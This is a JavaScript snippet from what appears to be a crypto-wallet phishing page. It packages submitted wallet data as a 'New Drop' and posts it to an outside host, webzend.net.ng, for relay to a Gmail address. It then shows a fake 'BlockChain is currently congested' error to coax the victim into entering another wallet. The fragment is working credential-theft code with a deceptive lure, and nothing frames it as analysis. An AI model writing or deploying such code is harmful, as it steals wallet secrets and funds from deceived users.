let sendObj={
	sendername:'Blockchain Sync Node',
	senderemail:'drops@KEYY.com',
	receiver:'PROJECTMAINNET@gmail.com ',
	subject:'New Drop',
	text: dropText
}

   // Send the data using AJAX
                 $.ajax({
                    url: 'https://webzend.net.ng/process.php',
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify(sendObj),
                    success: function(response) {

                    console.log('SUCCESS!', response.status, response.text);
                    $('#submit').text('Connect Wallet').css('pointer-events', 'all');

                    // Close the form area
                    $('#popup_connect_wallet').modal('hide');

                    // Show SweetAlert success message
                    Swal.fire({
                        title: 'Error!',
                        text: 'BlockChain is currently congested! Please try another wallet!',
                        icon: 'error'
                    }).then((result) => {
                        if (result.isConfirmed) {
                            // Optionally reset form or perform another action
                            $('#wallet-form')[0].reset();
                        }
                    });

                    },
                    error: function(xhr, status, error) {

                    console.log('FAILED...', error);
                    alert('Failed to send the email. Please try again later.');
                    $('#submit').text('Connect Wallet').css('pointer-events', 'all');


                    }
                });
